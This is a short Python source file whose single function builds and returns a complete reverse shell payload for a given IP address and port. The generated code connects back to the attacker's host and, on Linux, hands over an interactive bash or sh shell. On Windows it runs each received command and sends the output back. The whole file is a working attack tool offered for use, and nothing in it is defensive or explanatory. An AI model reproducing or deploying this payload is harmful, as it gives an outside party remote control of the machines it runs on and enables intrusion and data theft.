def generate(ip, port):
    payload = f'''import socket
import subprocess
import os
import platform

LHOST = "{ip}"
LPORT = {port}

def linux_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    for shell in ("/bin/bash", "/bin/sh"):
        try:
            subprocess.call([shell, "-i"])
            break
        except FileNotFoundError:
            continue

def windows_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    while True:
        data = s.recv(1024)
        if not data or data.decode("utf-8").strip() == "exit":
            break
        proc = subprocess.Popen(data.decode("utf-8"), shell=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        try:
            s.sendall(stdout_value)
        except Exception:
            break
    s.close()

if platform.system().lower().startswith('win'):
    windows_shell()
else:
    linux_shell()
'''
    return payload
